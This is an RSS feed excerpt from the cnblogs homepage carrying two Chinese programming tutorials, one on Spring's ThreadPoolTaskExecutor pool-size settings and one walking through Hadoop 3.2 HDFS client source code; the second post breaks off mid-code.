<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>ThreadPoolTaskExecutor 中 corePoolSize vs. maxPoolSize - 锅外的大佬</title>
<link>http://www.cnblogs.com/liululee/p/12596473.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/liululee/p/12596473.html</guid>
<description>&lt;h2 id=&quot;1-概览&quot;&gt;1. 概览&lt;/h2&gt;
&lt;p&gt;Spring中的 &lt;a href=&quot;https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/scheduling/concurrent/ThreadPoolTaskExecutor.html&quot;&gt;&lt;em&gt;ThreadPoolTaskExecutor&lt;/em&gt;&lt;/a&gt; 是一个 JavaBean ，提供围绕&lt;a href=&quot;https://www.baeldung.com/java-executor-service-tutorial&quot;&gt;&lt;em&gt;java.util.concurrent.ThreadPoolExecutor&lt;/em&gt;&lt;/a&gt; 的抽象实例，并作为Spring 中&lt;a href=&quot;https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/core/task/TaskExecutor.html&quot;&gt;&lt;em&gt;org.springframework.core.task.TaskExecutor&lt;/em&gt;&lt;/a&gt; 暴露出来. 此外，它可以通过&lt;em&gt;corePoolSize、maxPoolSize、queueCapacity、allowCoreThreadTimeOut&lt;/em&gt;和&lt;em&gt;keepAliveSeconds&lt;/em&gt;的属性进行高度配置。在本教程中，我们将查看&lt;em&gt;corePoolSize&lt;/em&gt;和&lt;em&gt;maxPoolSize&lt;/em&gt;属性。&lt;/p&gt;
&lt;h2 id=&quot;2-corepoolsize-vs-maxpoolsize&quot;&gt;2. &lt;em&gt;corePoolSize&lt;/em&gt; vs. &lt;em&gt;maxPoolSize&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;刚接触到这种抽象的用户可能很容易混淆这两个配置属性的区别。因此，让我们分别看一下。&lt;/p&gt;
&lt;h3 id=&quot;21-corepoolsize&quot;&gt;2.1. &lt;em&gt;corePoolSize&lt;/em&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;corePoolSize 是在不超时情况下，保持活跃的最少线程数&lt;/strong&gt; 。它是&lt;em&gt;ThreadPoolTaskExecutor&lt;/em&gt;的一个可配置项。但是, ThreadPoolTaskExecutor* 抽象将该值的设置委托给底层的&lt;strong&gt;java.util.concurrent.ThreadPoolExecutor&lt;/strong&gt;。为验证这一点，如果我们将&lt;em&gt;allowCoreThreadTimeOut&lt;/em&gt;设置为&lt;em&gt;true&lt;/em&gt;，那么所有线程都可能超时，等于将&lt;em&gt;corePoolSize&lt;/em&gt;的值设置为零。&lt;/p&gt;
&lt;h3 id=&quot;22-maxpoolsize&quot;&gt;2.2. &lt;em&gt;maxPoolSize&lt;/em&gt;&lt;/h3&gt;
&lt;p&gt;相反，&lt;strong&gt;maxPoolSize定义了可以创建的最大线程数&lt;/strong&gt;。类似地，&lt;em&gt;ThreadPoolTaskExecutor&lt;/em&gt;的&lt;em&gt;maxPoolSize&lt;/em&gt;属性也将其值委托给底层的&lt;em&gt;java.util.concurrent.ThreadPoolExecutor&lt;/em&gt;。为验证这点, &lt;em&gt;&lt;strong&gt;maxPoolSize&lt;/strong&gt;依赖于queueCapacity，因为&lt;/em&gt;ThreadPoolTaskExecutor&lt;em&gt;只会在其队列中的项目数超过&lt;/em&gt;queueCapacity*时创建一个新线程。&lt;/p&gt;
&lt;h2 id=&quot;3-所以，区别在哪&quot;&gt;3. 所以，区别在哪?&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;corePoolSize&lt;/em&gt;和&lt;em&gt;maxPoolSize&lt;/em&gt;之间的差别似乎很明显。然而，他们的行为有些微妙之处。&lt;/p&gt;
&lt;p&gt;当我们向&lt;em&gt;ThreadPoolTaskExecutor提交新任务时，&lt;/em&gt;如果正在运行的线程少于&lt;em&gt;corePoolSize&lt;/em&gt;线程，即使池中有空闲线程，或者如果正在运行的线程少于&lt;em&gt;maxPoolSize&lt;/em&gt;且由&lt;em&gt;queueCapacity&lt;/em&gt;定义的队列已满，它也会创建一个新线程。&lt;/p&gt;
&lt;p&gt;接下来，让我们看一些代码，以了解每个属性何时启动的示例。&lt;/p&gt;
&lt;h2 id=&quot;4-举例说明&quot;&gt;4. 举例说明&lt;/h2&gt;
&lt;p&gt;首先，假设我们有一个执行新线程的方法，它来自名为&lt;em&gt;startThreads&lt;/em&gt;的&lt;em&gt;ThreadPoolTaskExecutor&lt;/em&gt;：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public void startThreads(ThreadPoolTaskExecutor taskExecutor, CountDownLatch countDownLatch, 
  int numThreads) {
    for (int i = 0; i &amp;lt; numThreads; i++) {
        taskExecutor.execute(() -&amp;gt; {
            try {
                Thread.sleep(100L * ThreadLocalRandom.current().nextLong(1, 10));
                countDownLatch.countDown();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        });
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;让我们测试&lt;em&gt;ThreadPoolTaskExecutor&lt;/em&gt;的默认配置，它定义了一个线程的&lt;em&gt;corePoolSize&lt;/em&gt;、一个无限制的&lt;em&gt;maxPoolSize&lt;/em&gt;和无限制的&lt;em&gt;queueCapacity&lt;/em&gt;。因此，我们希望无论启动多少任务，都只运行一个线程：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Test
public void whenUsingDefaults_thenSingleThread() {
    ThreadPoolTaskExecutor taskExecutor = new ThreadPoolTaskExecutor();
    taskExecutor.afterPropertiesSet();
 
    CountDownLatch countDownLatch = new CountDownLatch(10);
    this.startThreads(taskExecutor, countDownLatch, 10);
 
    while (countDownLatch.getCount() &amp;gt; 0) {
        Assert.assertEquals(1, taskExecutor.getPoolSize());
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;现在，让我们将&lt;em&gt;corePoolSize&lt;/em&gt;更改为最多5个线程，并确保它的行为与建议中的一样。因此，无论提交给&lt;em&gt;ThreadPoolTaskExecutor&lt;/em&gt;的任务数是多少，我们都希望启动五个线程：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Test
public void whenCorePoolSizeFive_thenFiveThreads() {
    ThreadPoolTaskExecutor taskExecutor = new ThreadPoolTaskExecutor();
    taskExecutor.setCorePoolSize(5);
    taskExecutor.afterPropertiesSet();
 
    CountDownLatch countDownLatch = new CountDownLatch(10);
    this.startThreads(taskExecutor, countDownLatch, 10);
 
    while (countDownLatch.getCount() &amp;gt; 0) {
        Assert.assertEquals(5, taskExecutor.getPoolSize());
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;类似地，我们可以将&lt;em&gt;maxPoolSize&lt;/em&gt;增加到10，而将&lt;em&gt;corePoolSize&lt;/em&gt;保留为5。因此，我们希望只启动五个线程。为了更加清晰表明只有五个线程启动，因此&lt;em&gt;queueCapacity&lt;/em&gt;仍然是无限制的：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Test
public void whenCorePoolSizeFiveAndMaxPoolSizeTen_thenFiveThreads() {
    ThreadPoolTaskExecutor taskExecutor = new ThreadPoolTaskExecutor();
    taskExecutor.setCorePoolSize(5);
    taskExecutor.setMaxPoolSize(10);
    taskExecutor.afterPropertiesSet();
 
    CountDownLatch countDownLatch = new CountDownLatch(10);
    this.startThreads(taskExecutor, countDownLatch, 10);
 
    while (countDownLatch.getCount() &amp;gt; 0) {
        Assert.assertEquals(5, taskExecutor.getPoolSize());
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;此外，我们现在将重复前面的测试，但将&lt;em&gt;queueCapacity&lt;/em&gt;增加到10，并启动20个线程。因此，我们现在希望总共启动十个线程：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Test
public void whenCorePoolSizeFiveAndMaxPoolSizeTenAndQueueCapacityTen_thenTenThreads() {
    ThreadPoolTaskExecutor taskExecutor = new ThreadPoolTaskExecutor();
    taskExecutor.setCorePoolSize(5);
    taskExecutor.setMaxPoolSize(10);
    taskExecutor.setQueueCapacity(10);
    taskExecutor.afterPropertiesSet();
 
    CountDownLatch countDownLatch = new CountDownLatch(20);
    this.startThreads(taskExecutor, countDownLatch, 20);
 
    while (countDownLatch.getCount() &amp;gt; 0) {
        Assert.assertEquals(10, taskExecutor.getPoolSize());
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;同样，如果我们将&lt;em&gt;queueCapactity&lt;/em&gt;设置为零并且只启动了10个任务，那么我们的&lt;em&gt;ThreadPoolTaskExecutor&lt;/em&gt;中也会有10个线程。&lt;/p&gt;
&lt;h2 id=&quot;5-写在最后&quot;&gt;5. 写在最后&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;ThreadPoolTaskExecutor&lt;/em&gt;是围绕&lt;em&gt;java.util.concurrent.ThreadPoolExecutor&lt;/em&gt;的强大抽象，提供了配置&lt;em&gt;corePoolSize&lt;/em&gt;、&lt;em&gt;maxPoolSize&lt;/em&gt;和&lt;em&gt;queueCapacity&lt;/em&gt;的选项。在本教程中，我们查看了&lt;em&gt;corePoolSize&lt;/em&gt;和&lt;em&gt;maxPoolSize&lt;/em&gt;属性，以及&lt;em&gt;maxPoolSize&lt;/em&gt;如何与&lt;em&gt;queueCapacity&lt;/em&gt;协同工作，从而使我们能够轻松地为任何用例创建线程池。&lt;/p&gt;
&lt;p&gt;代码可在 &lt;a href=&quot;https://github.com/eugenp/tutorials/tree/master/spring-threads&quot;&gt;Github&lt;/a&gt; 中找到！&lt;br/&gt;叮叮叮！关注公众号： 锅外的大佬 ，加入锅外圈，不定时福利输出，hi&lt;sub&gt;欢迎你的加入哦&lt;/sub&gt;&lt;br/&gt;博客地址： &lt;a href=&quot;http://www.developlee.top&quot;&gt;http://www.developlee.top&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 30 Mar 2020 00:51:00 +0000</pubDate>
<dc:creator>锅外的大佬</dc:creator>
<og:description>1. 概览 Spring中的 &amp;quot; ThreadPoolTaskExecutor &amp;quot; 是一个 JavaBean ，提供围绕 &amp;quot; java.util.concurrent.T</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/liululee/p/12596473.html</dc:identifier>
</item>
<item>
<title>读Hadoop3.2源码，深入了解java调用HDFS的常用操作和HDFS原理 - 码大叔</title>
<link>http://www.cnblogs.com/madashu/p/12596421.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/madashu/p/12596421.html</guid>
<description>&lt;p&gt;本文将通过一个演示工程来快速上手java调用HDFS的常见操作。接下来通过阅读HDFS的源码，一步步展开HDFS相关原理、理论知识的说明。&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;438.26779944956&quot;&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;本文将通过一个演示工程来快速上手java调用HDFS的常见操作。接下来以创建文件为例，通过阅读HDFS的源码，一步步展开HDFS相关原理、理论知识的说明。&lt;br/&gt;说明：本文档基于最新版本Hadoop3.2.1&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;一、java调用hdfs的常见操作&quot;&gt;一、java调用HDFS的常见操作&lt;/h3&gt;
&lt;h4 id=&quot;11、演示环境搭建&quot;&gt;1.1、演示环境搭建&lt;/h4&gt;
&lt;h4 id=&quot;12、操作hdfs&quot;&gt;1.2、操作HDFS&lt;/h4&gt;
&lt;h4 id=&quot;13、java文件操作常用方法&quot;&gt;1.3、java文件操作常用方法&lt;/h4&gt;
&lt;h3 id=&quot;二、深入了解hdfs写文件的流程和hdfs原理&quot;&gt;二、深入了解HDFS写文件的流程和HDFS原理&lt;/h3&gt;
&lt;h4 id=&quot;21、hadoop321-源码下载及介绍&quot;&gt;2.1、Hadoop3.2.1 源码下载及介绍&lt;/h4&gt;
&lt;h4 id=&quot;22、文件系统：filesystem&quot;&gt;2.2、文件系统：FileSystem&lt;/h4&gt;
&lt;h4 id=&quot;23、hdfs体系结构：namenode、datanode、数据块&quot;&gt;2.3、HDFS体系结构：namenode、datanode、数据块&lt;/h4&gt;
&lt;h4 id=&quot;24、如何访问阿里云oss等文件系统&quot;&gt;2.4、如何访问阿里云OSS等文件系统&lt;/h4&gt;
&lt;h4 id=&quot;25、文件租约机制&quot;&gt;2.5、文件租约机制&lt;/h4&gt;
&lt;h4 id=&quot;26、rpc机制&quot;&gt;2.6、RPC机制&lt;/h4&gt;
&lt;h4 id=&quot;27、hdfs客户端写流程总结&quot;&gt;2.7、HDFS客户端写流程总结&lt;/h4&gt;
&lt;h4 id=&quot;28、hadoop3x新特性：纠删码&quot;&gt;2.8、Hadoop3.x新特性：纠删码&lt;/h4&gt;
&lt;h4 id=&quot;29-文件透明加密处理和目录树&quot;&gt;2.9 文件透明加密处理和目录树&lt;/h4&gt;
&lt;h4 id=&quot;210、hdfs客户端写流程总结&quot;&gt;2.10、HDFS客户端写流程总结&lt;/h4&gt;
&lt;hr/&gt;
&lt;p&gt;首先我们搭建一个简单的演示工程（演示工程使用的gradle，Maven项目也同样添加以下依赖），本次使用的是Hadoop最新的3.2.1。&lt;/p&gt;
&lt;h2 id=&quot;11、演示环境搭建-2&quot;&gt;1.1、演示环境搭建&lt;/h2&gt;
&lt;p&gt;新增一个普通的java工程即可，过程略，添加hdfs相关依赖jar包&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;implementation ('org.apache.hadoop:hadoop-common:3.2.1')
implementation ('org.apache.hadoop:hadoop-hdfs:3.2.1')
implementation ('org.apache.hadoop:hadoop-mapreduce-client-core:3.2.1')
implementation ('org.apache.hadoop:hadoop-client:3.2.1')
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在实际运行过程中，可能会发现日志Jar包冲突问题，排除掉即可&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;exclude group:'org.slf4j',module: 'slf4j-log4j12'
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;12、操作hdfs-2&quot;&gt;1.2、操作HDFS&lt;/h2&gt;
&lt;p&gt;以创建文件为例，代码如下。可以看到java操作hdfs就是这么简单、丝滑，so easy！&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;    public static void main(String[] args) throws IOException {
        // 配置对象
        Configuration configuration = new Configuration();
        configuration.set(&quot;fs.defaultFS&quot;, &quot;hdfs://172.22.28.202:9000&quot;);
        // HDFS文件系统的操作对象
        FileSystem fileSystem = FileSystem.get(configuration);
        // 创建文件。
        FSDataOutputStream outputStream =
            fileSystem.create(new Path(&quot;/hdfs/madashu/test&quot;));
        // 写入文件内容
        outputStream.write(&quot;你好Hadoop,我是码大叔&quot;.getBytes());
        outputStream.flush();
        IOUtils.closeStream(outputStream);
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;13、java文件操作常用方法-2&quot;&gt;1.3、java文件操作常用方法&lt;/h2&gt;
&lt;p&gt;参照第2步文件创建的操作，我们可以预定义好Configuration和FileSystem，然后提取出HDFSUtil的工具类出来。涉及到文件方面的操作基本只需要hadoop-common包下的&lt;code&gt;FileSystem&lt;/code&gt;就足够了，一些常用方法的说明：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;//文件是否存在
fileSystem.exists(new Path(fileName));
//创建目录
fileSystem.mkdirs(new Path(directorName));
//删除目录或文件,第二个参数表示是否要递归删除
fileSystem.delete(new Path(name), true);
//获取当前登录用户在HDFS文件系统中的Home目录
fileSystem.getHomeDirectory();
//文件重命名
fileSystem.rename(new Path(oldName), new Path(newName));
//读取文件，返回的是FSDataInputStream
fileSystem.open(new Path(fileName));
//创建文件，第二个参数表示文件存在时是否覆盖
fileSystem.create(new Path(fileName), false);
//从本地目录上传文件到HDFS
fileSystem.copyFromLocalFile(localPath, hdfsPath);
//获取目录下的文件信息，包含path，length，group，blocksize，permission等等
fileSystem.listStatus(new Path(directorName));
//释放资源
fileSystem.close();
//设置HDFS资源权限，其中FsPermission可以设置user、group等
fileSystem.setPermission(new Path(resourceName), fsPermission);
//设置HDFS资源的Owner和group
fileSystem.setOwner(new Path(resourceName), ownerName, groupName);
//设置文件的副本
fileSystem.setReplication(new Path(resourceName), count);
&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;文件操作的方法比较多，本期我们以create方法为例，来通过阅读源码深入了解下hdfs写文件的流程和原理，代码参见1.2 。&lt;/p&gt;
&lt;h2 id=&quot;21、hadoop321-源码下载及介绍-2&quot;&gt;2.1、Hadoop3.2.1 源码下载及介绍&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;hadoop源码地址&lt;/strong&gt;：&lt;a href=&quot;https://github.com/apache/hadoop%EF%BC%8C%E3%80%82&quot;&gt;https://github.com/apache/hadoop，。&lt;/a&gt;&lt;br/&gt;正常途径下访问比较慢的同学（每次写到这句话，都满脸的忧伤和xx）也可以通过国内的&lt;strong&gt;清华大学开源软件镜像站&lt;/strong&gt;来下载，地址是https://mirrors.tuna.tsinghua.edu.cn/apache/hadoop/common/hadoop-3.2.1/hadoop-3.2.1-src.tar.gz&lt;/p&gt;
&lt;p&gt;下载后我们可以看到这是一个maven工程，导入到idea等我们熟悉开发工具中即可。如果是使用VS需要编译的小伙伴注意下，&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200329175011478.png&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;br/&gt;目录下有一个BUILDINDG.txt文件，针对比较关键的几个modules做了说明。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2020032918141152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phNW9u,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;br/&gt;这里面很多工程都是和打包相关的，有一个没提到的“hadoop-cloud-storage-project”是和云存储相关的，比如我们熟悉的阿里云，AWS等。这次我们需要关注的是hadoop-hdfs-project，hadoop-hdfs-common-project。&lt;/p&gt;
&lt;h2 id=&quot;22、文件系统：filesystem-2&quot;&gt;2.2、文件系统：FileSystem&lt;/h2&gt;
&lt;p&gt;代码参见1.2，我们看到在操作hdfs之前首先需要根据配置文件获取文件系统。&lt;br/&gt;&lt;strong&gt;问题&lt;/strong&gt;：&lt;br/&gt;1、为什么传入的地址是“hdfs:”开头的&lt;br/&gt;2、为什么要获取文件操作系统&lt;/p&gt;
&lt;p&gt;我们直接进入get方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;  public static FileSystem get(URI uri, Configuration conf) throws IOException {
    //获取文件的前缀，即我们传入的 hdfs:
    String scheme = uri.getScheme();
    // 为了便于阅读，删除掉很多代码
    // 从缓存中获取
    return CACHE.get(uri, conf);
  }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;那么缓存中存放了什么呢？一层层深入代码，首先会检查文件系统是否存在，不存在则创建文件系统，最终将文件系统存放在map中。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt; private static final Map&amp;lt;String, Class&amp;lt;? extends FileSystem&amp;gt;&amp;gt;
      SERVICE_FILE_SYSTEMS = new HashMap&amp;lt;&amp;gt;();
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public final class HdfsConstants {
  /**
   * URI Scheme for hdfs://namenode/ URIs.
   */
  public static final String HDFS_URI_SCHEME = &quot;hdfs&quot;;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们再回过头来打开&lt;code&gt;FileSystem&lt;/code&gt;类&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public abstract class FileSystem extends Configured implements Closeable, DelegationTokenIssuer 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到FileSystem是一个抽象类，它有很多的子类即实现，比如DistributedFileSystem。所以这一步的操作实际是根据你输入的前缀，通过Java中SPI机制从Serviceloder中获取所需的文件操作系统。这里我们还很惊喜地看到&lt;strong&gt;AliyunOSSFileSystem&lt;/strong&gt;。Hadoop3.x中默认支持阿里云OSS对象存储系统作为Hadoop兼容的文件系统。阿里云OSS是中国云计算厂商第一个也是目前唯一一个被Hadoop官方版本支持的云存储系统。这是继Docker支持阿里云存储以后又一个更重大的里程碑，这也表明主流开源社区对中国技术生态的认可。假如我们要使用阿里云的文件系统，前缀是什么呢？翻看&lt;code&gt;AliyunOSSFileSystem&lt;/code&gt;代码&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;  public String getScheme() {
    return &quot;oss&quot;;
  }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;比如 oss://madashu/test。同样如果需要使用亚马逊的文件系统，则前缀是“abfs://”&lt;/p&gt;
&lt;h2 id=&quot;23、hdfs体系结构：namenode、datanode、数据块-2&quot;&gt;2.3、HDFS体系结构：namenode、datanode、数据块&lt;/h2&gt;
&lt;p&gt;根据1.2实例代码，获取到文件操作系统后，就是创建文件了，最终我们跟踪到如下的方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;  public abstract FSDataOutputStream create(Path f,
      FsPermission permission,
      boolean overwrite,
      int bufferSize,
      short replication,
      long blockSize,
      Progressable progress) throws IOException;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;参数说明：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Path:存放路径&lt;/li&gt;
&lt;li&gt;FsPermission：文件权限&lt;/li&gt;
&lt;li&gt;overwrite：当文件存在时是否覆盖&lt;/li&gt;
&lt;li&gt;bufferSize：客户端的buffer大小&lt;/li&gt;
&lt;li&gt;replication：文件副本数&lt;/li&gt;
&lt;li&gt;blockSize：块大小&lt;/li&gt;
&lt;li&gt;Progressable：文件写入的进度&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这里有2个参数：replication和blockSize，在解释之前得先了解一下HDFS的体系结构&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200329184806295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phNW9u,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;HDFS是一个主/从（Master/Slave）体系结构的分布式系统，将一个大文件分成若干块保存在不同服务器的多个节点中，通过联网让用户感觉像是在本地一样查看文件。HDFS集群拥有1个Namenode和n个Datanode，用户可以通过HDFS客户端和Namenode、Datanodes交互以访问文件系统。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Namenode&lt;/strong&gt;是HDFS的master节点，负责管理文件系统的命名空间，即namespace，他维护这文件系统树及整棵树内所有的文件和目录。这些信息以&lt;strong&gt;命名空间镜像&lt;/strong&gt;文件和&lt;strong&gt;编辑日志文件&lt;/strong&gt;两个文件持久化保存在文件磁盘上。namenode也留着每个文件中各个块所在的数据节点信息，但是&lt;strong&gt;并不永久保存块的位置信息，这些块的位置信息会在系统启动时根据数据信息节点创建&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Datanode&lt;/strong&gt;是文件系统的工作节点，它根据客户端或namenode需要存储并检索数据块，并且定期向nomenode发送所存储的块的列表。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Block&lt;/strong&gt;是HDFS的最小存储单元。默认大小：128M（HDFS 1.x中，默认64M），若文件大小不足128M，则会单独成为一个block。实质上就是Linux相应目录下的普通文件，名称格式：blk_xxxxxxx。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HDFS块为什么这么大呢&lt;/strong&gt;？HDFS的块比磁盘的块大，主要是为了最小化寻址的开销。如果块足够大，从磁盘传输数据的时间会明显大于定位这个块开始位置所需的时间。因而，传输一个由多个块组成的大文件的时间取决于磁盘传输速率。如果一个1MB的文件存储在一个128M的块中时，文件实际只是用了1M的磁盘空间，而不是128M。&lt;/p&gt;
&lt;p&gt;为了降低文件丢失造成的错误，它会为每个小文件复制多个副本（默认为三个），以此来实现多机器上的多用户分享文件和存储。&lt;br/&gt;第一个复本会随机选择，但是不会选择存储过满的节点。&lt;br/&gt;第二个复本放在和第一个复本不同且随机选择的机架上。&lt;br/&gt;第三个和第二个放在同一个机架上的不同节点上。&lt;br/&gt;剩余的副本就完全随机节点了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;补充1&lt;/strong&gt;：create方法还有最后一个参数：Progressable，主要是为了便于我们知悉文件的写入进度，使用方法如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;    FSDataOutputStream outputStream = fileSystem.create(new Path(targetDirector +   File.separator + fileName), new Progressable() {
        long fileCount = 0;
        @Override
        public void progress() {
        fileCount++;
        System.out.println(&quot;总进度：&quot; + fileCount + &quot;|&quot; + fileSize + &quot;|&quot; + (fileCount / fileSize) * 100 + &quot;%&quot;);
        }
    });
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;补充2&lt;/strong&gt;：在Hadoop3.2中namenode的默认端口配置发生变化：从50070改为9870&lt;/p&gt;
&lt;h2 id=&quot;24、如何访问阿里云oss等文件系统-2&quot;&gt;2.4、如何访问阿里云OSS等文件系统&lt;/h2&gt;
&lt;p&gt;我们继续往下扒代码&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Override
  public FSDataOutputStream create(final Path f, final FsPermission permission,
      final EnumSet&amp;lt;CreateFlag&amp;gt; cflags, final int bufferSize,
      final short replication, final long blockSize,
      final Progressable progress, final ChecksumOpt checksumOpt)
      throws IOException {
    // 文件操作统计，比如创建、删除、拷贝等等，以及操作次数
    statistics.incrementWriteOps(1);
    storageStatistics.incrementOpCounter(OpType.CREATE);
    // 创建文件输出流，采用了责任链的设计模式
    Path absF = fixRelativePart(f);
    return new FileSystemLinkResolver&amp;lt;FSDataOutputStream&amp;gt;() {
      @Override
      public FSDataOutputStream doCall(final Path p) throws IOException {
        final DFSOutputStream dfsos = dfs.create(getPathName(p), permission,
            cflags, replication, blockSize, progress, bufferSize,
            checksumOpt);
        return dfs.createWrappedOutputStream(dfsos, statistics);
      }
      @Override
      public FSDataOutputStream next(final FileSystem fs, final Path p)
          throws IOException {
        return fs.create(p, permission, cflags, bufferSize,
            replication, blockSize, progress, checksumOpt);
      }
    }.resolve(this, absF);
  }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接下来再进入&lt;code&gt;FileSystemLinkResolver&lt;/code&gt;类：&lt;br/&gt;1、调用doCall 内部类 DFSClient的create方法，然后将DFSOutputStream包装FSDataOutputStream&lt;br/&gt;2、如果是符号链接文件，则一层一层找到最底层的文件。甚至能连接到其他的文件系统的文件，比如从HDFS文件系统连接到阿里云OSS文件系统、亚马逊文件系统等。&lt;/p&gt;
&lt;h2 id=&quot;25、文件租约机制-2&quot;&gt;2.5、文件租约机制&lt;/h2&gt;
&lt;p&gt;继续跟踪代码，进入&lt;code&gt;DFSClient&lt;/code&gt;类&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;  public DFSOutputStream create(String src, FsPermission permission,
      EnumSet&amp;lt;CreateFlag&amp;gt; flag, boolean createParent, short replication,
      long blockSize, Progressable progress, int buffersize,
      ChecksumOpt checksumOpt, InetSocketAddress[] favoredNodes,
      String ecPolicyName) throws IOException {
    //检查客户端是否已经在运行了
    checkOpen();
    final FsPermission masked = applyUMask(permission);
    LOG.debug(&quot;{}: masked={}&quot;, src, masked);
    //创建文件输出流，和Namenode进行交互
    final DFSOutputStream result = DFSOutputStream.newStreamForCreate(this,
        src, masked, flag, createParent, replication, blockSize, progress,
        dfsClientConf.createChecksum(checksumOpt),
        getFavoredNodesStr(favoredNodes), ecPolicyName);
    //更新文件租约：也可以理解为token，保证不会发生写文件冲突。
    beginFileLease(result.getFileId(), result);
    return result;
  }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们看到最后一个beginFileLease操作，也就是获取文件租约。我们暂时先忽略文件创建的过程，继续往下翻和FileLease有关的代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;  //如果是第一次，还是设置文件租约。
  stat = FSDirWriteFileOp.startFile(this, iip, permissions, holder,
